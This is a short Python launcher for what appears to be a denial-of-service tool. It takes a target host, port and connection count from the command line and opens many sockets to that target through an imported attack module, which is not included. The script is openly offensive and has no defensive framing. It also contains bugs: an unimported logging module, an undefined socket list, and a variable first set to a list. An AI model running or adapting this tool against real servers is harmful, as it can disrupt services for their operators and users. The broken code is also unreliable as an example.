#!/usr/bin/env python3

import socket
from parser import Parser as p
from attack import start_attack

def attack():
    for _ in range(int(result["connection_count"])):
        try:
            s = a.initialize_socket()
            a.perform_attack(s, result["connection_count"])
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)


#veni vidi vici
if __name__ == '__main__':
    result = []
    result = p.parse_arguments()
    a = start_attack(result["host"], result["port"])
    attack()


